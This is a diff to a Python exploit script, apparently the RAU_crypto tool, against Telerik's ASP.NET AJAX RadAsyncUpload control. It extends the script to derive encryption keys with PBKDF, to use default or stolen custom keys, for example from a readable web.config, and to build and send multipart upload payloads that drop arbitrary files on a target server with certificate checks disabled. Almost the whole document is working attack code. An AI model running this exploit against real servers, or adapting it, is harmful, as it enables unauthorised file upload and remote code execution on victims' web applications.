@@ -13,6 +13,10 @@
 # versions R2 2017 SP1 (2017.2.621) and providing the ability to disable the
 # RadAsyncUpload feature in R2 2017 SP2 (2017.2.711)
 
+# Updated exploit works on later versions where custom keys have been set if you
+# have access to them, e.g. readable web.config
+# not compatible when machine key protect encryption is used
+
 # https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload
 # https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/insecure-direct-object-reference
 # http://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security
@@ -28,20 +32,112 @@ import os
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC
 from Crypto.Hash import SHA256
+from Crypto.Hash import SHA1
+from struct import Struct
+from operator import xor
+from itertools import starmap
 
 import binascii
 
-# Warning, the below prevents certificate warnings,
-# and verify = False in the later code prevents them being verified
-
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+#   ******************************************
+#   ******************************************
+
+# ADVANCED_SETTINGS section 1 of 2
+# Warning, the below prevents certificate warnings,
+# and verify = False (CERT_VERIFY prevents them being verified
+
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+CERT_VERIFY = False
+
+#   ******************************************
+#   ******************************************
+
+class PBKDF:
+
+    def sha1(v):
+        hl = SHA1.new()
+        hl.update(v)
+        return hl.digest()
+
+    def derive1(password, salt):
+        hash = (password + salt).encode()
+        for i in range(0, 99):
+            hash = PBKDF.sha1(hash)
+
+        result = PBKDF.sha1(hash)
+        i = 1
+        while len(result) < 48:
+            result += PBKDF.sha1(str(i).encode() + hash)
+            i += 1
+
+        return result
+
+    def hmacsha1(v):
+        hl = PBKDF.mac.copy()
+        hl.update(v)
+        return bytearray(hl.digest())
+
+
+    def derive2(password, salt):
+        # Credit: @mitsuhiko https://github.com/mitsuhiko/python-pbkdf2/blob/master/pbkdf2.py
+        result_length = 48
+        PBKDF.mac = HMAC.new(bytes(password.encode()), None, SHA1.new())
+        result = []
+        for b in range(1, -(-result_length // PBKDF.mac.digest_size) + 1):
+            rv = u = PBKDF.hmacsha1(salt.encode() + Struct('>i').pack(b))
+            for i in range(999):
+                u = PBKDF.hmacsha1(u)
+                rv = starmap(xor, zip(rv, u))
+            result.extend(rv)
+        result = b''.join(map(bytes, [result]))[:result_length]
+        return result
+
+    def derive(type, password,salt = ''.join(chr(i) for i in [58, 84, 91, 25, 10, 34, 29, 68, 60, 88, 44, 51, 1])):
+        if type == 1:
+            result = PBKDF.derive1(password, salt)
+            result = result[0:32] + result[8:16] + result[40:48] # Bizarre hack
+        elif type == 2:
+            result = PBKDF.derive2(password, salt)
+
+        return result[0:32], result[32:]
 
 
 class RAUCipher:
-    key = binascii.unhexlify("EB8AF90FDE30FECBE330E807CF0B4252" +
-                             "A44E9F06A2EA4AF10B046F598DD3EA0C")
-    iv = binascii.unhexlify("E330E807CF0B425255A3A561A707D269")
+
+
+#   ******************************************
+#   ******************************************
+
+    # ADVANCED_SETTINGS section 2 of 2
+
+    # Default settings are for vulnerable versions before 2017 patches with default keys
+
+    T_Upload_ConfigurationHashKey = \
+        "PrivateKeyForHashOfUploadConfiguration" # Default hardcoded key for versions before 2017 patches
+    HASHKEY = T_Upload_ConfigurationHashKey # or your custom hashkey
+
+    T_AsyncUpload_ConfigurationEncryptionKey = \
+        "PrivateKeyForEncryptionOfRadAsyncUploadConfiguration" # Default hardcoded key for versions before 2017 patches
+    PASSWORD = T_AsyncUpload_ConfigurationEncryptionKey # or your custom password
+
+    # Latest tested version working with this setting: 2018.1.117
+    # Probably working up to and including 2018.3.910
+    PBKDF_ALGORITHM = 1
+
+    # Earliest tested version working with this setting: 2019.2.514
+    # Probably introduced 2019.1.115
+#    PBKDF_ALGORITHM = 2
+
+#   ******************************************
+#   ******************************************
+
+    key, iv = PBKDF.derive(PBKDF_ALGORITHM, PASSWORD)
+
+#    print(binascii.hexlify(key).decode().upper())
+#    print(binascii.hexlify(iv).decode().upper())
 
     def encrypt(plaintext):
         sys.stderr.write("Encrypting... ")
@@ -54,7 +150,8 @@ class RAUCipher:
                             )
         cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
         sys.stderr.write("done\n")
-        return base64.b64encode(cipher.encrypt(bytes(plaintext, encoding = "utf8"))).decode()
+        return base64.b64encode(cipher.encrypt(plaintext.encode())).decode()
+
 
     def decrypt(ciphertext):
         sys.stderr.write("Decrypting... ")
@@ -62,41 +159,44 @@ class RAUCipher:
         cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
         unpad = lambda s: s[0:-ord(chr(s[-1]))]
         sys.stderr.write("done\n")
-        return unpad(cipher.decrypt(ciphertext[0:])).decode()[0::2]
+        return unpad(cipher.decrypt(ciphertext)).decode()[0::2]
+
 
     def addHmac(string, Version):
 
         isHmacVersion = False
 
         # "Encrypt-then-MAC" feature introduced in R1 2017
-        # Required for "2017.1.118", "2017.1.228", "2017.2.503"
+        # Required for >= "2017.1.118" (e.g. "2017.1.118", "2017.1.228", "2017.2.503" etc.)
 
-        if "2017" in Version:
+        if int(Version[:4]) >= 2017:
             isHmacVersion = True
 
         hmac = HMAC.new(
-            b'PrivateKeyForHashOfUploadConfiguration',
-            bytes(string.encode()),
+            bytes(RAUCipher.HASHKEY.encode()),
+            string.encode(),
             SHA256.new()
             )
+
         hmac = base64.b64encode(hmac.digest()).decode()
         return string + hmac if isHmacVersion else string
 
 
 def getProxy(proxy):
-    return { 'http' : proxy, 'https' : proxy }
+    return { "http" : proxy, "https" : proxy }
 
 
 def rauPostData_enc(partA, partB):
-    data = "-----------------------------62616f37756f2e\r\n"
+    data = "-----------------------------62616f37756f2f\r\n"
     data += "Content-Disposition: form-data; name=\"rauPostData\"\r\n"
     data += "\r\n"
     data += RAUCipher.encrypt(partA) + "&" + RAUCipher.encrypt(partB) + "\r\n"
     return  data
 
+
 def rauPostData_prep(TempTargetFolder, Version):
     TargetFolder = RAUCipher.addHmac(
-                                "jgas0meSrU/uP/TPzrhDTw==",
+                                RAUCipher.encrypt(""),
                                 Version
                                 )
     TempTargetFolder = RAUCipher.addHmac(
@@ -116,24 +216,6 @@ def rauPostData_prep(TempTargetFolder, Version):
     return rauPostData_enc(partA, partB)
 
 
-def getVersion(url, proxy = False):
-    sys.stderr.write("Contacting server... ")
-    response = requests.get(url, verify=False, proxies = getProxy(proxy))
-    html = response.text
-    sys.stderr.write("done\n")
-    match = re.search(
-        '((?<=\<\!-- )20\d{2}(.\d+)+(?= --\>))|' +
-        '(?<=Version%3d)20\d{2}(.\d+)+(?=%2c)|' +
-        '(?<=Version=)20\d{2}(.\d+)+(?=,)',
-        html
-        )
-
-    if match:
-        return match.group(0)
-    else:
-        return "No version result"
-
-
 def payload(TempTargetFolder, Version, payload_filename):
     sys.stderr.write("Local file path: " + payload_filename + "\n")
     payload_filebasename = os.path.basename(payload_filename)
@@ -146,47 +228,50 @@ def payload(TempTargetFolder, Version, payload_filename):
     payload_file.close()
 
     data = rauPostData_prep(TempTargetFolder, Version)
-    data += "-----------------------------62616f37756f2e\r\n"
+    data += "-----------------------------62616f37756f2f\r\n"
     data += "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
     data += "Content-Type: application/octet-stream\r\n"
     data += "\r\n"
-    data += payload_file_data.decode('raw_unicode_escape') + "\r\n"
-    data += "-----------------------------62616f37756f2e\r\n"
+    data += payload_file_data.decode("raw_unicode_escape") + "\r\n"
+    data += "-----------------------------62616f37756f2f\r\n"
     data += "Content-Disposition: form-data; name=\"fileName\"\r\n"
     data += "\r\n"
     data += "RAU_crypto.bypass\r\n"
-    data += "-----------------------------62616f37756f2e\r\n"
+    data += "-----------------------------62616f37756f2f\r\n"
     data += "Content-Disposition: form-data; name=\"contentType\"\r\n"
     data += "\r\n"
     data += "text/html\r\n"
-    data += "-----------------------------62616f37756f2e\r\n"
+    data += "-----------------------------62616f37756f2f\r\n"
     data += "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
     data += "\r\n"
     data += "2019-01-02T03:04:05.067Z\r\n"
-    data += "-----------------------------62616f37756f2e\r\n"
+    data += "-----------------------------62616f37756f2f\r\n"
     data += "Content-Disposition: form-data; name=\"metadata\"\r\n"
     data += "\r\n"
     data += "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + \
             payload_filebasename + "\"}\r\n"
-    data += "-----------------------------62616f37756f2e--\r\n"
+    data += "-----------------------------62616f37756f2f--\r\n"
     data += "\r\n"
     sys.stderr.write("Payload prep done\n")
     return data
 
 
 def upload(data, url, proxy = False):
+
+    global CERT_VERIFY
+
     sys.stderr.write("Preparing to send request to " + url + "\n")
     session = requests.Session()
     request = requests.Request(
-                        'POST',
+                        "POST",
                         url,
                         data=data
                         )
     request = request.prepare()
     request.headers["Content-Type"] = \
         "multipart/form-data; " +\
-        "boundary=---------------------------62616f37756f2e"
-    response = session.send(request, verify=False, proxies = getProxy(proxy))
+        "boundary=---------------------------62616f37756f2f"
+    response = session.send(request, verify=CERT_VERIFY, proxies = getProxy(proxy))
     sys.stderr.write("Request done\n")
     return response.text
 
@@ -234,10 +319,10 @@ def mode_Encrypt_rauPostData():
 
 def custom_payload(partA, partB):
     return  rauPostData_enc(partA, partB) \
-    + "-----------------------------62616f37756f2e\r\n" \
+    + "-----------------------------62616f37756f2f\r\n" \
     + "Content-Disposition: filename=\"bao7uo\"\r\n" \
     + "\r\n" \
-    + "-----------------------------62616f37756f2e--\r\n"
+    + "-----------------------------62616f37756f2f--\r\n"
 
 
 def mode_encrypt_custom_Payload():
@@ -254,22 +339,12 @@ def mode_send_custom_Payload_proxy():
     mode_send_custom_Payload(sys.argv[5])
 
 
-def mode_version_proxy():
-    mode_version(sys.argv[3])
-
-
-def mode_version(proxy = False):
-    # extract Telerik web ui version details from url
-    url = sys.argv[2]
-    print(getVersion(url, proxy))
-
-
 def mode_payload():
     # generate a payload based on TempTargetFolder, Version and payload file
     TempTargetFolder = sys.argv[2]
     Version = sys.argv[3]
     payload_filename = sys.argv[4]
-    print("Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2e")
+    print("Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2f")
     print(payload(TempTargetFolder, Version, payload_filename))
 
 
@@ -303,9 +378,11 @@ def mode_help():
         "Generate custom payload POST data : -c partA partB\n" +
         "Send custom payload:                -c partA partB url [proxy]\n\n" +
 
-        "Version in HTTP response:           -v url [proxy]\n\n" +
-
-        "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau"
+        "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\n"
+        "Example Version:           2016.2.504\n"
+        "Example optional proxy:    127.0.0.1:8080"
+        "\n" +
+        "N.B. Advanced settings e.g. custom keys or PBKDB algorithm can be found by searching source code for: ADVANCED_SETTINGS\n"
     )
 
 
@@ -331,10 +408,6 @@ elif sys.argv[1] == "-C" and len(sys.argv) == 5:
     mode_send_custom_Payload()
 elif sys.argv[1] == "-C" and len(sys.argv) == 6:
     mode_send_custom_Payload_proxy()   
-elif sys.argv[1] == "-v" and len(sys.argv) == 3:
-    mode_version()
-elif sys.argv[1] == "-v" and len(sys.argv) == 4:
-    mode_version_proxy()
 elif sys.argv[1] == "-p" and len(sys.argv) == 5:
     mode_payload()
 elif sys.argv[1] == "-P" and len(sys.argv) == 6:
